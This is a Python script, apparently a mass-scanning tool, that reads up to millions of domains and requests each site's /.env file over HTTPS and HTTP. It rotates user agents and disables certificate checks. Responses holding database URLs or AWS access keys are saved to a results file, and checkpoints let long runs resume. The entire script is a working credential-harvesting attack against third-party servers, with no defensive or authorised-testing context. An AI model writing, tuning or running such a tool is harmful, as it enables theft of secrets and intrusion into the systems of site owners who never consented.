import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, local
import os
import random
import time
import socket
from requests.adapters import HTTPAdapter
from urllib3.util.connection import create_connection
from collections import deque
import threading

# Monkey patch socket to enable aggressive connection settings
_orig_create_connection = create_connection
def patched_create_connection(address, timeout=socket._GLOBAL_DEFAULT_TIMEOUT, source_address=None, socket_options=None):
    sock = _orig_create_connection(address, timeout, source_address, socket_options)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 0)  # Disable keepalive
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)  # Disable Nagle
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b'\x01\x00\x00\x00\x00\x00\x00\x00')  # Immediate close
    return sock
create_connection = patched_create_connection

# Configuration
DOMAINS_FILE = "domains.txt"
OUTPUT_FILE = "extracted_env_data.txt"
CHECKPOINT_FILE = "progress_checkpoint.txt"
MAX_THREADS = 200  # Optimized for 10M domains - increase for faster processing
TIMEOUT = 2  # Aggressive timeout for speed
WRITE_BUFFER_SIZE = 50  # Buffer results before writing to disk
CHECKPOINT_INTERVAL = 1000  # Less frequent checkpoints for speed
PROGRESS_INTERVAL = 5000  # Show progress every 5k domains

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
]

# Thread-safe counters
file_lock = Lock()
counter_lock = Lock()
success_count = 0
processed_count = 0

# Buffered write queue for better I/O performance
write_buffer = deque()
write_lock = Lock()

# Thread-local storage for sessions
thread_local = local()

def load_checkpoint():
    """Load the last processed line number from checkpoint file"""
    if os.path.exists(CHECKPOINT_FILE):
        try:
            with open(CHECKPOINT_FILE, 'r') as f:
                data = f.read().strip().split(',')
                if len(data) >= 2:
                    return int(data[0]), int(data[1])
        except:
            pass
    return 0, 0

def save_checkpoint(processed, success):
    """Save current progress to checkpoint file atomically"""
    temp_file = CHECKPOINT_FILE + '.tmp'
    with open(temp_file, 'w') as f:
        f.write(f"{processed},{success}")
    os.replace(temp_file, CHECKPOINT_FILE)

def get_session():
    """Get or create a thread-local session with optimized connection pooling"""
    if not hasattr(thread_local, 'session'):
        session = requests.Session()
        # Aggressive connection pooling for maximum throughput
        adapter = HTTPAdapter(
            pool_connections=50,
            pool_maxsize=100,
            max_retries=0,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        thread_local.session = session
    return thread_local.session

def flush_write_buffer():
    """Flush buffered results to disk"""
    with write_lock:
        if not write_buffer:
            return
        with open(OUTPUT_FILE, 'a', encoding='utf-8', buffering=8192*8) as f:
            while write_buffer:
                f.write(write_buffer.popleft())

def normalize_domain(domain):
    domain = domain.strip()
    if not domain:
        return None
    domain = domain.rstrip('/')
    if not domain.startswith(('http://', 'https://')):
        return f"https://{domain}"
    return domain

def fetch_env_file(domain):
    """Fetch .env file from domain with optimized speed"""
    normalized = normalize_domain(domain)
    if not normalized:
        return None, None
    
    session = get_session()
    
    try:
        # Try HTTPS first, then HTTP if needed
        urls_to_try = [f"{normalized}/.env"]
        if normalized.startswith('https://'):
            http_url = normalized.replace('https://', 'http://')
            urls_to_try.append(f"{http_url}/.env")
        
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Connection': 'close',
        }
        
        for url in urls_to_try:
            try:
                response = session.get(
                    url,
                    headers=headers,
                    timeout=TIMEOUT,
                    allow_redirects=False,
                    verify=False,
                    stream=False
                )
                if response.status_code == 200 and response.text:
                    content = response.text
                    # Quick validation - check for env file patterns
                    if any(key in content for key in ['DATABASE_URL=', 'AWS_ACCESS_KEY_ID']):
                        return url, content
            except:
                continue  # Fail fast
    except:
        pass
    
    return None, None

def buffer_result(url, content):
    """Buffer result for batch writing"""
    result = "=" * 80 + "\n"
    result += f"SOURCE: {url}\n"
    result += f"TIMESTAMP: {time.strftime('%Y-%m-%d %H:%M:%S')}\n"
    result += "=" * 80 + "\n"
    result += content
    result += "\n\n"
    
    with write_lock:
        write_buffer.append(result)
        # Flush if buffer is full
        if len(write_buffer) >= WRITE_BUFFER_SIZE:
            flush_write_buffer()

def process_domain(domain):
    """Process a single domain"""
    global success_count, processed_count
    
    url, content = fetch_env_file(domain)
    
    with counter_lock:
        processed_count += 1
        local_processed = processed_count
        
        if url and content:
            success_count += 1
            local_success = success_count
            buffer_result(url, content)
        else:
            local_success = success_count
        
        # Periodic checkpoint saves
        if local_processed % CHECKPOINT_INTERVAL == 0:
            flush_write_buffer()  # Ensure data is written
            save_checkpoint(local_processed, local_success)
            elapsed = time.time() - start_time
            rate = local_processed / elapsed if elapsed > 0 else 0
            print(f"[CHECKPOINT] Processed: {local_processed:,} | Success: {local_success:,} | Rate: {rate:.1f}/s")
        elif local_processed % PROGRESS_INTERVAL == 0:
            elapsed = time.time() - start_time
            rate = local_processed / elapsed if elapsed > 0 else 0
            print(f"[PROGRESS] Processed: {local_processed:,} | Success: {local_success:,} | Rate: {rate:.1f}/s")
    
    return url is not None

def domain_generator(filename, skip_lines=0):
    """Generate domains from file, optionally skipping already processed ones"""
    with open(filename, 'r', encoding='utf-8', buffering=1024*1024) as f:
        # Skip already processed domains efficiently
        for _ in range(skip_lines):
            next(f, None)
        
        for line in f:
            domain = line.strip()
            if domain:
                yield domain

# Global start time for rate calculation
start_time = None

def main():
    global success_count, processed_count, start_time
    print("=" * 80)
    print("ENV FILE EXTRACTOR - Optimized for 10M+ Domains")
    print("=" * 80)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Load checkpoint to resume from last position
    checkpoint_processed, checkpoint_success = load_checkpoint()
    
    # Determine if we're resuming
    resuming = checkpoint_processed > 0
    
    if resuming:
        print(f"\n[*] RESUMING from checkpoint...")
        print(f"[*] Previously processed: {checkpoint_processed:,} domains")
        print(f"[*] Previous successes: {checkpoint_success:,}")
        processed_count = checkpoint_processed
        success_count = checkpoint_success
    else:
        print(f"\n[*] Starting fresh scan...")
        if os.path.exists(OUTPUT_FILE):
            os.remove(OUTPUT_FILE)
        if os.path.exists(CHECKPOINT_FILE):
            os.remove(CHECKPOINT_FILE)
    
    print(f"\n[*] Configuration:")
    print(f"    - Domain file: {DOMAINS_FILE}")
    print(f"    - Output file: {OUTPUT_FILE}")
    print(f"    - Max threads: {MAX_THREADS}")
    print(f"    - Timeout: {TIMEOUT}s")
    print(f"    - Checkpoint interval: {CHECKPOINT_INTERVAL:,} domains")
    print(f"    - Write buffer size: {WRITE_BUFFER_SIZE}")
    
    # Skip counting total domains for speed on large files
    if resuming:
        print(f"\n[*] Resuming from domain {checkpoint_processed + 1:,}...")
    else:
        print(f"\n[*] Processing domains from {DOMAINS_FILE}...")
    
    if not os.path.exists(DOMAINS_FILE):
        print(f"[ERROR] File '{DOMAINS_FILE}' not found!")
        return
    
    print("\n[*] Starting scan...\n")
    start_time = time.time()
    
    try:
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            domains_iter = domain_generator(DOMAINS_FILE, skip_lines=checkpoint_processed)
            
            # Use sliding window to prevent memory buildup
            active_futures = set()
            max_queue = MAX_THREADS * 2  # Smaller queue for better memory management
            
            for domain in domains_iter:
                # Wait if queue is full
                while len(active_futures) >= max_queue:
                    done_futures = {f for f in active_futures if f.done()}
                    for f in done_futures:
                        try:
                            f.result()
                        except:
                            pass
                    active_futures -= done_futures
                    if len(active_futures) >= max_queue:
                        time.sleep(0.001)
                
                # Submit new domain
                future = executor.submit(process_domain, domain)
                active_futures.add(future)
            
            # Wait for remaining futures
            for future in as_completed(active_futures):
                try:
                    future.result()
                except:
                    pass
                    
    except KeyboardInterrupt:
        print("\n\n[!] Scan interrupted by user!")
        flush_write_buffer()
        print(f"[*] Saving checkpoint at {processed_count:,} domains...")
        save_checkpoint(processed_count, success_count)
        print(f"[*] Progress saved! Resume anytime.")
        print(f"[*] Processed: {processed_count:,}, Success: {success_count:,}")
        return
    
    # Final flush and save
    flush_write_buffer()
    elapsed_time = time.time() - start_time
    save_checkpoint(processed_count, success_count)
    
    print("\n" + "=" * 80)
    print("SCAN COMPLETE")
    print("=" * 80)
    print(f"Total processed: {processed_count:,}")
    print(f"Successful extractions: {success_count:,}")
    if processed_count > 0:
        print(f"Success rate: {(success_count/processed_count*100):.2f}%")
    print(f"Time elapsed: {elapsed_time:.2f}s ({elapsed_time/60:.1f} minutes)")
    if elapsed_time > 0:
        print(f"Average speed: {processed_count/elapsed_time:.1f} domains/second")
    print(f"\nResults saved to: {OUTPUT_FILE}")
    print(f"Checkpoint saved to: {CHECKPOINT_FILE}")
    print("=" * 80)

if __name__ == "__main__":
    main()
